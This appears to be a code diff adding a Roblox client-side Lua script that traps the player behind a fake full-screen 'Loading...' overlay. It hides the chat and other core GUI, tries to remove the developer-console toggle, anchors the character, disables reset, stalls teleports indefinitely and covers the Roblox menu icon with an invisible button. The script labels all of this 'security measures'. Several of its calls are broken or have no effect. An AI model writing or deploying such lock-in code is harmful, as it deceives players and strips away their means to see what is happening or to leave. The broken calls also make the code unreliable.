@@ -1,0 +1,179 @@
+local GuiService = game:GetService("GuiService")
+
+local function createScreenLock()
+print("[DEBUG] createScreenLock called")
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "ScreenLock"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true -- Ensures it covers the entire screen
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0 -- Ensure it's fully opaque
+frame.Active = true
+
+-- Block all input in the frame
+frame.InputBegan:Connect(function(input, gameProcessed)
+if gameProcessed then return end
+print("[DEBUG] Input blocked: " .. tostring(input.UserInputType))
+input.UserInputState = Enum.UserInputState.Cancel
+end)
+
+-- Add loading text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(0.3, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0.35, 0, 0.45, 0)
+loadingText.Text = "Loading..."
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.BackgroundTransparency = 1
+loadingText.Font = Enum.Font.SourceSansBold
+loadingText.TextScaled = true
+loadingText.Parent = frame
+
+frame.Parent = gui
+gui.Parent = player:WaitForChild("PlayerGui")
+end
+
+local function showLoading()
+print("[DEBUG] showLoading called")
+print("loading...")
+end
+
+local function blockCoreGui()
+print("[DEBUG] blockCoreGui called")
+local coreGuiTypes = { Enum.CoreGuiType.Chat, Enum.CoreGuiType.Health, Enum.CoreGuiType.PlayerList, Enum.CoreGuiType.EmotesMenu }
+for _, coreGuiType in ipairs(coreGuiTypes) do
+game.StarterGui:SetCoreGuiEnabled(coreGuiType, false)
+end
+end
+
+local function blockDeveloperConsole()
+print("[DEBUG] blockDeveloperConsole called")
+for _, bindableEvent in pairs(game:GetService("UserInputService"):GetChildren()) do
+if bindableEvent:IsA("BindableEvent") and bindableEvent.Name == "ToggleDevConsole" then
+bindableEvent:Destroy()
+end
+end
+end
+local function blockInput()
+print("[DEBUG] blockInput called")
+local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
+mouse.KeyDown:Connect(function(key)
+print("[DEBUG] Key input blocked: " .. key)
+end)
+mouse.Button1Down:Connect(function()
+print("[DEBUG] Left mouse button blocked")
+end)
+mouse.Button2Down:Connect(function()
+print("[DEBUG] Right mouse button blocked")
+end)
+end
+
+local function anchorCharacter()
+print("[DEBUG] anchorCharacter called")
+local player = game.Players.LocalPlayer
+player.CharacterAdded:Connect(function(character)
+local hrp = character:WaitForChild("HumanoidRootPart")
+print("[DEBUG] Character anchored")
+hrp.Anchored = true
+end)
+if player.Character then
+local hrp = player.Character:WaitForChild("HumanoidRootPart")
+print("[DEBUG] Character anchored")
+hrp.Anchored = true
+end
+end
+
+local function preventResetAndEsc()
+print("[DEBUG] preventResetAndEsc called")
+local player = game.Players.LocalPlayer
+task.wait(1)
+player.OnTeleport:Connect(function(teleportState)
+if teleportState == Enum.TeleportState.Started then
+print("[DEBUG] Teleport attempt blocked")
+task.wait(math.huge)
+end
+end)
+game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
+game:GetService("RunService").Stepped:Connect(function()
+pcall(function()
+for _, connection in pairs(getmetatable(player.OnTeleport)) do
+if typeof(connection) == "RBXScriptConnection" then
+print("[DEBUG] Reset/Esc attempt blocked")
+connection:Disconnect()
+end
+end
+end)
+end)
+end
+
+local function hideRobloxGui()
+print("[DEBUG] hideRobloxGui called")
+local coreGuiTypes = { Enum.CoreGuiType.All, Enum.CoreGuiType.Backpack, Enum.CoreGuiType.PlayerList, Enum.CoreGuiType.Chat, Enum.CoreGuiType.Health, Enum.CoreGuiType.EmotesMenu }
+for _, coreGuiType in ipairs(coreGuiTypes) do
+game.StarterGui:SetCoreGuiEnabled(coreGuiType, false)
+end
+end
+
+local function blockAllInputs()
+print("[DEBUG] blockAllInputs called")
+local player = game.Players.LocalPlayer
+local screenLock = player.PlayerGui:WaitForChild("ScreenLock")
+screenLock.InputBegan:Connect(function(input, gameProcessed)
+if gameProcessed then return end
+
+-- Block mouse button inputs
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then
+print("[DEBUG] Mouse input blocked")
+input.UserInputState = Enum.UserInputState.Cancel
+
+-- Block touch inputs for mobile
+elseif input.UserInputType == Enum.UserInputType.Touch then
+print("[DEBUG] Touch input blocked")
+input.UserInputState = Enum.UserInputState.Cancel
+
+-- Block keyboard inputs
+elseif input.UserInputType == Enum.UserInputType.Keyboard then
+print("[DEBUG] Keyboard input blocked")
+input.UserInputState = Enum.UserInputState.Cancel
+end
+end)
+end
+
+local function coverRobloxIcon()
+print("[DEBUG] coverRobloxIcon called")
+
+local player = game.Players.LocalPlayer
+local gui = player:WaitForChild('PlayerGui')
+local coverButton = Instance.new('TextButton')
+
+-- Manually set the oversized size and position
+coverButton.Size = UDim2.new(0, 200, 0, 200) -- much larger size to cover
+coverButton.Position = UDim2.new(0, 0, 0, 0) -- starting at the top-left corner
+coverButton.Text = ''
+coverButton.BackgroundTransparency = 1 -- Make it invisible
+coverButton.ZIndex = 10 -- Ensure it appears above other UI elements
+coverButton.Parent = gui
+
+-- Disable the button functionality
+coverButton.MouseButton1Click:Connect(function()
+print('Roblox icon cover clicked')
+end)
+end
+
+-- Execution of functions
+createScreenLock()
+showLoading()
+blockCoreGui()
+blockDeveloperConsole()
+blockInput()
+anchorCharacter()
+preventResetAndEsc()
+hideRobloxGui()
+blockAllInputs() -- Ensures all inputs are captured and blocked
+coverRobloxIcon() -- Covers the Roblox icon with an invisible button
+print("All security measures are in place.")
